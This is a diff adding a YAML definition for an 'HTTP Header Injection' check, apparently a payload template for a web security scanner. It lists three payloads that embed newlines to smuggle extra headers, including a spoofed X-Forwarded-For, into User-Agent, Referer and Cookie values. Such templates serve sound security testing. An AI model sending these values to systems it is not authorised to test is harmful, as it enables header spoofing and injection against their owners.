@@ -1,0 +1,7 @@
+name: "HTTP Header Injection"
+type: "header_injection1"
+severity: "medium"
+payloads:
+  - "User-Agent: Mozilla/5.0\nX-Malicious: true"
+  - "Referer: http://evil.com\nX-Forwarded-For: 127.0.0.1"
+  - "Cookie: SESSION=123\nX-Attack: payload"
